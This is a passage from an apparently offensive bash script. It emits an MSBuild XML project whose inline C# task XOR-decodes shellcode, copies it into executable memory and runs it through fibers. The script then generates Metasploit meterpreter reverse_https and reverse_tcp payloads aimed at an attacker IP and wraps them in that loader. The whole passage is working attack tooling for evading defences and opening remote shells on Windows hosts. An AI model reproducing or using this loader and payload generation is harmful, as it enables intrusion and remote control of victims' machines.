                      public extern static IntPtr CreateFiber(int dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter);

                      [DllImport("kernel32.dll", SetLastError = true)]
                      public extern static IntPtr SwitchToFiber(IntPtr fiberAddress);
              
              
              
                  public override bool Execute()
                  {
                                
                        $shellcode

                                   for (int i = 0; i < shellcode.Length; i++)
                                   {
                                   buf[i] = (byte)((((uint)shellcode[i] ^ 0xAA) - 3) & 0xFF);
                                   }

                        IntPtr main_fiber = ConvertThreadToFiber(IntPtr.Zero);
                
                
                        IntPtr funcAddr = VirtualAlloc(IntPtr.Zero, (UInt32)shellcode.Length,
                          MEM_COMMIT, PAGE_EXECUTE_READWRITE);
               
                        Marshal.Copy(shellcode, 0, (IntPtr)(funcAddr), shellcode.Length);
                        IntPtr hThread = IntPtr.Zero;
                        UInt32 threadId = 0;
                        IntPtr pinfo = IntPtr.Zero;
               
                      IntPtr buf1_fiber = CreateFiber(0, funcAddr, IntPtr.Zero);
                      SwitchToFiber(buf1_fiber);
                
                
                        return true;
                  } 
                }     
              ]]>
              </Code>
            </Task>
          </UsingTask>
        </Project>
EOF
}



#######################################
# Generate metasploit payloads
# Globals:
#   None
# Arguments:
#   None
# Outputs:
#   Write three different format files (ps1, raw, csharp) to msf_tmp/ for each payload
#######################################

callMsfScript(){
    echo -e "\n"
    echo ".........................................MSF CONSOLE..................................................."
    echo -e "\n"
    #python3 msf_tmp/msf2.py --payload "windows/x64/meterpreter/reverse_https" --ip $IP --port 443 --filetype ps1 --ssl 1
    python3 msf_tmp/msf2.py --payload "windows/x64/meterpreter/reverse_https" --ip $IP --port 443 --filetype raw --ssl 1

    #python3 msf_tmp/msf2.py --payload "windows/x64/meterpreter/reverse_tcp" --ip $IP --port 443 --filetype ps1 --ssl 0
    python3 msf_tmp/msf2.py --payload "windows/x64/meterpreter/reverse_tcp" --ip $IP --port 443 --filetype raw --ssl 0

    #python3 msf_tmp/msf2.py --payload "windows/x64/meterpreter/reverse_winhttps" --ip $IP --port 443 --filetype ps1 --ssl 1
    #python3 msf_tmp/msf2.py --payload "windows/x64/meterpreter/reverse_winhttps" --ip $IP --port 443 --filetype raw --ssl 1
    
    # Execute the XOR script and generate the XML payloads
    create_xml_payload "reverse_https.raw"
    create_xml_payload "reverse_tcp.raw"
   # create_xml_payload "reverse_winhttps.raw"
}




# Execute the msfvenom python script
callMsfScript $IP
